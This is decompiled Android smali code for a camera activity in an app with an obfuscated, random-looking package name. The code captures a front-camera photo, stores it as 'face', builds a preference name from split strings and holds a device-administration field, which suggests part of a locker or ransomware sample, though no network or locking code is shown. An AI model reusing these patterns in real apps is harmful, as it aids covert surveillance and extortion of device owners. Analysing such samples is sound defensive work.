.class public Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;
.super Landroid/app/Activity;
.source "MainScreen.java"

# interfaces
.implements Landroid/hardware/Camera$AutoFocusCallback;
.implements Landroid/hardware/Camera$PictureCallback;
.implements Landroid/hardware/Camera$PreviewCallback;
.implements Landroid/view/SurfaceHolder$Callback;
.implements Landroid/view/View$OnClickListener;


# instance fields
.field private ACTIVATION_REQUEST:I

.field public camera:Landroid/hardware/Camera;

.field private cameraId:I

.field private fgol:I

.field private mDPM:Landroid/app/admin/DevicePolicyManager;

.field private preview:Landroid/view/SurfaceView;

.field private sfdsds:Landroid/hardware/Camera$PictureCallback;

.field private shotBtn:Landroid/widget/Button;

.field private surfaceHolder:Landroid/view/SurfaceHolder;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 37
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 41
    const/16 v0, 0x7b

    iput v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->ACTIVATION_REQUEST:I

    .line 48
    const/4 v0, 0x1

    iput v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->fgol:I

    .line 37
    return-void
.end method

.method private getFrontCameraId()I
    .locals 6
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    .prologue
    .line 110
    const/4 v0, -0x1

    .line 112
    .local v0, "camId":I
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v3

    .line 113
    .local v3, "numberOfCameras":I
    new-instance v1, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v1}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 115
    .local v1, "ci":Landroid/hardware/Camera$CameraInfo;
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    if-lt v2, v3, :cond_0

    .line 122
    return v0

    .line 116
    :cond_0
    invoke-static {v2, v1}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 117
    iget v4, v1, Landroid/hardware/Camera$CameraInfo;->facing:I

    const/4 v5, 0x1

    if-ne v4, v5, :cond_1

    .line 118
    move v0, v2

    .line 115
    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0
.end method


# virtual methods
.method public onAutoFocus(ZLandroid/hardware/Camera;)V
    .locals 1
    .param p1, "paramBoolean"    # Z
    .param p2, "paramCamera"    # Landroid/hardware/Camera;

    .prologue
    const/4 v0, 0x0

    .line 206
    if-eqz p1, :cond_0

    .line 208
    invoke-virtual {p2, v0, v0, v0, p0}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 210
    :cond_0
    return-void
.end method

.method public onClick(Landroid/view/View;)V
    .locals 6
    .param p1, "v"    # Landroid/view/View;

    .prologue
    .line 221
    :try_start_0
    iget-object v1, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    invoke-virtual {v1, v2, v3, v4, p0}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 224
    :goto_0
    const/4 v1, 0x2

    iput v1, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->fgol:I

    .line 235
    move-object v0, p0

    .line 236
    .local v0, "vtx":Landroid/content/Context;
    new-instance v1, Ljava/util/Timer;

    invoke-direct {v1}, Ljava/util/Timer;-><init>()V

    new-instance v2, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen$1;

    invoke-direct {v2, p0, v0}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen$1;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;Landroid/content/Context;)V

    .line 246
    const-wide/16 v4, 0x7d0

    .line 236
    invoke-virtual {v1, v2, v4, v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 247
    return-void

    .line 222
    .end local v0    # "vtx":Landroid/content/Context;
    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/4 v2, 0x1

    .line 53
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 56
    invoke-virtual {p0, v2}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->setRequestedOrientation(I)V

    .line 59
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x400

    invoke-virtual {v0, v1}, Landroid/view/Window;->addFlags(I)V

    .line 62
    invoke-virtual {p0, v2}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->requestWindowFeature(I)Z

    .line 64
    const v0, 0x7f030007

    invoke-virtual {p0, v0}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->setContentView(I)V

    .line 67
    const v0, 0x7f08002b

    :try_start_0
    invoke-virtual {p0, v0}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/view/SurfaceView;

    iput-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->preview:Landroid/view/SurfaceView;

    .line 69
    iget-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->preview:Landroid/view/SurfaceView;

    invoke-virtual {v0}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v0

    iput-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->surfaceHolder:Landroid/view/SurfaceHolder;

    .line 70
    iget-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->surfaceHolder:Landroid/view/SurfaceHolder;

    invoke-interface {v0, p0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 71
    iget-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->surfaceHolder:Landroid/view/SurfaceHolder;

    const/4 v1, 0x3

    invoke-interface {v0, v1}, Landroid/view/SurfaceHolder;->setType(I)V

    .line 72
    const v0, 0x7f080030

    invoke-virtual {p0, v0}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->shotBtn:Landroid/widget/Button;

    .line 74
    iget-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->shotBtn:Landroid/widget/Button;

    invoke-virtual {v0, p0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 77
    :goto_0
    return-void

    .line 75
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method protected onPause()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    .line 94
    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    .line 96
    iget-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    .line 97
    iget-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    .line 98
    iget-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    .line 99
    iget-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 100
    iput-object v1, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    .line 103
    :cond_0
    return-void
.end method

.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 12
    .param p1, "paramArrayOfByte"    # [B
    .param p2, "paramCamera"    # Landroid/hardware/Camera;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    .prologue
    .line 180
    :try_start_0
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->getCacheDir()Ljava/io/File;

    move-result-object v7

    invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    .line 182
    .local v2, "extStorageDirectory":Ljava/lang/String;
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "/%d.jpg"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    const/4 v9, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v10

    invoke-static {v10, v11}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v10

    aput-object v10, v8, v9

    .line 181
    invoke-static {v7, v8}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    .line 184
    .local v3, "ff":Ljava/lang/String;
    new-instance v5, Ljava/io/FileOutputStream;

    invoke-direct {v5, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    .line 185
    .local v5, "os":Ljava/io/FileOutputStream;
    invoke-virtual {v5, p1}, Ljava/io/FileOutputStream;->write([B)V

    .line 186
    invoke-virtual {v5}, Ljava/io/FileOutputStream;->close()V

    .line 188
    const-string v4, "oc"

    .line 189
    .local v4, "fsd":Ljava/lang/String;
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "c"

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "on"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x0

    invoke-virtual {p0, v7, v8}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    .line 190
    .local v6, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 191
    .local v1, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v7, "face"

    invoke-interface {v1, v7, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 192
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 202
    .end local v1    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v2    # "extStorageDirectory":Ljava/lang/String;
    .end local v3    # "ff":Ljava/lang/String;
    .end local v4    # "fsd":Ljava/lang/String;
    .end local v5    # "os":Ljava/io/FileOutputStream;
    .end local v6    # "settings":Landroid/content/SharedPreferences;
    :goto_0
    return-void

    .line 193
    :catch_0
    move-exception v0

    .line 194
    .local v0, "e":Ljava/lang/Exception;
    const-string v7, "gh"

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "fff0="

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method public onPreviewFrame([BLandroid/hardware/Camera;)V
    .locals 0
    .param p1, "paramArrayOfByte"    # [B
    .param p2, "paramCamera"    # Landroid/hardware/Camera;

    .prologue
    .line 215
    return-void
.end method

.method protected onResume()V
    .locals 2
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    .prologue
    .line 82
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 83
    iget v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->fgol:I

    const/4 v1, 0x2

    if-eq v0, v1, :cond_0

    .line 85
    :try_start_0
    invoke-direct {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->getFrontCameraId()I

    move-result v0

    iput v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->cameraId:I

    .line 86
    iget v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->cameraId:I

    invoke-static {v0}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v0

    iput-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 90
    :cond_0
    :goto_0
    return-void

    .line 87
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0
    .param p1, "holder"    # Landroid/view/SurfaceHolder;
    .param p2, "format"    # I
    .param p3, "width"    # I
    .param p4, "height"    # I

    .prologue
    .line 108
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 7
    .param p1, "holder"    # Landroid/view/SurfaceHolder;

    .prologue
    .line 128
    :try_start_0
    iget-object v5, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    invoke-virtual {v5, p1}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V

    .line 129
    iget-object v5, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    invoke-virtual {v5, p0}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 134
    :goto_0
    :try_start_1
    iget-object v5, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    invoke-virtual {v5}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v5

    invoke-virtual {v5}, Landroid/hardware/Camera$Parameters;->getPreviewSize()Landroid/hardware/Camera$Size;

    move-result-object v2

    .line 135
    .local v2, "previewSize":Landroid/hardware/Camera$Size;
    iget v5, v2, Landroid/hardware/Camera$Size;->width:I

    int-to-float v5, v5

    iget v6, v2, Landroid/hardware/Camera$Size;->height:I

    int-to-float v6, v6

    div-float v0, v5, v6

    .line 137
    .local v0, "aspect":F
    iget-object v5, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->preview:Landroid/view/SurfaceView;

    invoke-virtual {v5}, Landroid/view/SurfaceView;->getWidth()I

    move-result v4

    .line 138
    .local v4, "previewSurfaceWidth":I
    iget-object v5, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->preview:Landroid/view/SurfaceView;

    invoke-virtual {v5}, Landroid/view/SurfaceView;->getHeight()I

    move-result v3

    .line 140
    .local v3, "previewSurfaceHeight":I
    iget-object v5, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->preview:Landroid/view/SurfaceView;

    invoke-virtual {v5}, Landroid/view/SurfaceView;->getLayoutParams()Landroid/view/ViewGroup$LayoutParams;

    move-result-object v1

    .line 145
    .local v1, "lp":Landroid/view/ViewGroup$LayoutParams;
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->getResources()Landroid/content/res/Resources;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v5

    iget v5, v5, Landroid/content/res/Configuration;->orientation:I

    const/4 v6, 0x2

    if-eq v5, v6, :cond_0

    .line 147
    iget-object v5, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    const/16 v6, 0x5a

    invoke-virtual {v5, v6}, Landroid/hardware/Camera;->setDisplayOrientation(I)V

    .line 148
    iput v3, v1, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 149
    int-to-float v5, v3

    div-float/2addr v5, v0

    float-to-int v5, v5

    iput v5, v1, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 158
    :goto_1
    iget-object v5, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->preview:Landroid/view/SurfaceView;

    invoke-virtual {v5, v1}, Landroid/view/SurfaceView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 159
    iget-object v5, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    invoke-virtual {v5}, Landroid/hardware/Camera;->startPreview()V

    .line 163
    .end local v0    # "aspect":F
    .end local v1    # "lp":Landroid/view/ViewGroup$LayoutParams;
    .end local v2    # "previewSize":Landroid/hardware/Camera$Size;
    .end local v3    # "previewSurfaceHeight":I
    .end local v4    # "previewSurfaceWidth":I
    :goto_2
    return-void

    .line 153
    .restart local v0    # "aspect":F
    .restart local v1    # "lp":Landroid/view/ViewGroup$LayoutParams;
    .restart local v2    # "previewSize":Landroid/hardware/Camera$Size;
    .restart local v3    # "previewSurfaceHeight":I
    .restart local v4    # "previewSurfaceWidth":I
    :cond_0
    iget-object v5, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/MainScreen;->camera:Landroid/hardware/Camera;

    const/4 v6, 0x0

    invoke-virtual {v5, v6}, Landroid/hardware/Camera;->setDisplayOrientation(I)V

    .line 154
    iput v4, v1, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 155
    int-to-float v5, v4

    div-float/2addr v5, v0

    float-to-int v5, v5

    iput v5, v1, Landroid/view/ViewGroup$LayoutParams;->height:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    .line 160
    .end local v0    # "aspect":F
    .end local v1    # "lp":Landroid/view/ViewGroup$LayoutParams;
    .end local v2    # "previewSize":Landroid/hardware/Camera$Size;
    .end local v3    # "previewSurfaceHeight":I
    .end local v4    # "previewSurfaceWidth":I
    :catch_0
    move-exception v5

    goto :goto_2

    .line 130
    :catch_1
    move-exception v5

    goto :goto_0
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0
    .param p1, "holder"    # Landroid/view/SurfaceHolder;

    .prologue
    .line 167
    return-void
.end method
